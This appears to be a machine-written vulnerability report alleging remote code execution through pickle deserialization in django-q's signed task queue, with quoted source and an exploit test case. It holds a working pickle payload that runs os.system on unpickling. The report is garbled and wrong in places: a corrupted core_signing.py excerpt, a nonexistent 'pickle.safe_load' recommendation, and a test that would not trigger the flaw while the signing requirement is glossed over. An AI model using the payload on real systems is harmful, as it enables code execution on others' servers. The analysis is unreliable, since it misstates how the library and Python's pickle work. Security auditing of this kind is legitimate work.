### Vulnerability List

- Vulnerability Name: Pickle Deserialization Vulnerability in Task Processing

- Description:
    1. An attacker can craft a malicious payload that exploits Python's pickle deserialization process.
    2. The attacker submits this payload as a task to the django-q queue.
    3. When a worker processes this task, it uses `SignedPackage.loads` in `django_q/signing.py` to deserialize the task data.
    4. If the crafted payload is not properly validated, `pickle.loads` can execute arbitrary code on the worker machine.
    5. This can lead to remote code execution on the server hosting the django-q worker.

- Impact:
    - **Critical**: Remote Code Execution (RCE). An attacker can gain complete control over the worker server, potentially leading to data breaches, service disruption, and further attacks on the infrastructure.

- Vulnerability Rank: critical

- Currently Implemented Mitigations:
    - Task packages are signed using Django's signing mechanism (`django.core.signing`) via `SignedPackage` class in `django_q/signing.py`. This is intended to prevent tampering with the task data in transit.
    - The `SignedPackage.dumps` and `SignedPackage.loads` methods use a SECRET_KEY and PREFIX salt from Django settings to enhance the signature's security.

- Missing Mitigations:
    - **Input Validation and Sanitization**: The application lacks proper validation and sanitization of task data before deserialization using `pickle.loads`. While signing prevents tampering in transit, it does not prevent deserialization vulnerabilities if the original serialized data is malicious.
    - **Alternative Serialization**: Relying on `pickle` for deserialization of potentially untrusted data is inherently risky. Moving away from pickle to a safer serialization format like JSON (if feasible for the data structures) would significantly reduce this risk. If pickle is necessary, consider using `pickle.safe_load` if available and applicable, or explore other secure deserialization practices.

- Preconditions:
    - An attacker needs to be able to submit tasks to the django-q queue. This is often possible if task queuing is exposed through a web interface or API, even indirectly.
    - The django-q worker needs to be configured to process tasks from a queue that an attacker can influence.

- Source Code Analysis:
    1. **`django_q/signing.py`**:
        ```python
        import pickle

        from django_q import core_signing as signing
        from django_q.conf import Conf

        BadSignature = signing.BadSignature


        class SignedPackage:
            """Wraps Django's signing module with custom Pickle serializer."""

            @staticmethod
            def dumps(obj, compressed: bool = Conf.COMPRESSED) -> str:
                return signing.dumps(
                    obj,
                    key=Conf.SECRET_KEY,
                    salt=Conf.PREFIX,
                    compress=compressed,
                    serializer=PickleSerializer,
                )

            @staticmethod
            def loads(obj) -> any:
                return signing.loads(
                    obj, key=Conf.SECRET_KEY, salt=Conf.PREFIX, serializer=PickleSerializer
                )


        class PickleSerializer:
            """Simple wrapper around Pickle for signing.dumps and signing.loads."""

            @staticmethod
            def dumps(obj) -> bytes:
                return pickle.dumps(obj, protocol=pickle.HIGHEST_PROTOCOL)

            @staticmethod
            def loads(data) -> any:
                return pickle.loads(data)
        ```
        - The `SignedPackage` class is responsible for signing and loading task packages.
        - `SignedPackage.loads` uses `signing.loads` from `django_q.core_signing` with `PickleSerializer`.
        - `PickleSerializer.loads` directly calls `pickle.loads(data)` without any input validation, which is the root cause of the vulnerability.

    2. **`django_q/core_signing.py`**:
        ```python
        import datetime
        import time
        import zlib

        from django.core.signing import BadSignature, JSONSerializer, SignatureExpired
        from django.core.signing import Signer as Sgnr
        from django.core.signing import TimestampSigner as TsS

        from django.utils import baseconv
        from django.utils.crypto import constant_time_compare
        from django.utils.encoding import force_bytes, force_str

        dumps = dumps

        """

        ):
            """

            base64d = force_bytes(TimestampSigner(key, salt=salt).unsign(s, max_age=max_age))
            decompress = False
            if base64d[:1] == b".":
                # It's compressed; uncompress it first
                base64d = base64d[1:]
                decompress = True
            data = b64_decode(base64d)
            if decompress:
                data = zlib.decompress(data)
            return serializer().loads(data)

        # ... (Signer and TimestampSigner classes)
        ```
        - This file provides the `loads` function used by `SignedPackage.loads`.
        - It includes signature verification using `TimestampSigner.unsign`, which confirms the integrity of the data during transit.
        - However, the vulnerability persists because after signature verification, the data is still deserialized using the potentially unsafe `PickleSerializer().loads(data)`. The signature only ensures that the data hasn't been tampered with after signing, but not that the original serialized data is safe.

    3. **`django_q/cluster.py`**:
        ```python
        def worker(
            task_queue: Queue, result_queue: Queue, timer: Value, timeout: int = Conf.TIMEOUT
        ):
            # ...
            for task in iter(task_queue.get, "STOP"):
                # ...
                try:
                    f = task["func"]
                    # if it's not an instance try to get it from the string
                    if not callable(task["func"]):
                        f = pydoc.locate(f) # potential code injection if task["func"] is user controlled and not validated
                    # ...
                    res = f(*task["args"], **task["kwargs"]) # execution of deserialized function
                    result = (res, True)
                except Exception as e:
                    result = (f"{e} : {traceback.format_exc()}", False)
                    # ...
                # ...

        def pusher(task_queue: Queue, event: Event, broker: Broker = None):
            # ...
            while True:
                # ...
                if task_set:
                    for task in task_set:
                        ack_id = task[0]
                        # unpack the task
                        try:
                            task = SignedPackage.loads(task[1]) # Deserialization happens here
                        except (TypeError, BadSignature) as e:
                            logger.error(e, traceback.format_exc())
                            broker.fail(ack_id)
                            continue
                        task["ack_id"] = ack_id
                        task_queue.put(task)
                # ...

        ```
        - The `pusher` function in `cluster.py` is where tasks are dequeued from the broker and deserialized using `SignedPackage.loads(task[1])`. This is the entry point for the malicious payload.
        - The `worker` function then retrieves tasks from the `task_queue` and executes the deserialized function `f` with its arguments.

- Security Test Case:
    1. **Prerequisites**:
        - Set up a Django project with django-q installed and configured to use a broker (e.g., Redis, ORM).
        - Ensure a django-q cluster is running and processing tasks.
        - Identify a way to enqueue tasks, either through the Django admin, a custom view, or directly using `async_task` in the Django shell.
    2. **Craft Malicious Payload**:
        - Create a Python script to generate a malicious pickle payload. This payload should execute arbitrary code when deserialized. For example, to execute `touch /tmp/pwned`:
          ```python
          import pickle
          import base64
          import os

          class RCE:
              def __reduce__(self):
                  cmd = 'touch /tmp/pwned'
                  return (os.system,(cmd,))

          serialized_payload = base64.b64encode(pickle.dumps(RCE())).decode()
          print(serialized_payload)
          ```
        - Save the output `serialized_payload`. This is your malicious pickled data, base64 encoded for potential transport as string.

    3. **Enqueue Malicious Task**:
        - Using the Django shell or a custom view, enqueue a task using `async_task`.
        - To exploit the vulnerability, you need to somehow inject the malicious payload into the arguments or keyword arguments of a task.  Since the provided files do not give explicit details on how arguments are passed or constructed in the enqueue process, we assume a simplified injection method for testing.  A more realistic scenario would involve exploiting a web interface or API that uses user input to construct task arguments.
        - For a simplified test, you might try to directly enqueue a task where one of the arguments is your malicious pickled payload (base64 decoded back to bytes if needed depending on how it's handled).  However, directly passing serialized data as arguments might be atypical.
        - A more practical approach for a test case (depending on how arguments are handled in the application using django-q) would be to identify an existing task function used within the project and attempt to modify the input to that task function to *include* or *become* the malicious payload when it is serialized and queued by `async_task`.

    4. **Trigger Task Processing**:
        - Ensure the django-q worker processes the enqueued task. This should happen automatically if the cluster is running and the task is in the queue.

    5. **Verify Code Execution**:
        - Check if the command in your malicious payload was executed on the worker server. In our example, check if the file `/tmp/pwned` was created on the worker's filesystem.
        - If `/tmp/pwned` exists, it confirms that the pickle deserialization vulnerability was successfully exploited and arbitrary code execution was achieved.

- Security Test Case (Simplified - Assumes direct argument injection for demonstration):
    1. **Prerequisites**: (Same as above)
    2. **Craft Malicious Payload**: (Same as above, get `serialized_payload`)
    3. **Enqueue Malicious Task (Django Shell)**:
        ```python
        from django_q.tasks import async_task
        import base64

        malicious_payload_b64 = "{serialized_payload}" # Replace with your generated payload
        malicious_payload_bytes = base64.b64decode(malicious_payload_b64)

        def dummy_task(arg):
            pass # Task function, doesn't really matter for this test

        async_task(dummy_task, malicious_payload_bytes)
        ```
    4. **Trigger Task Processing**: (Let django-q worker process the task)
    5. **Verify Code Execution**: (Check for `/tmp/pwned`)

This vulnerability highlights a critical security flaw due to the unsafe deserialization of task payloads using `pickle.loads`. While the signing mechanism adds integrity, it does not protect against malicious payloads that are validly signed. Mitigation should focus on input validation before deserialization or migrating to a safer serialization method.
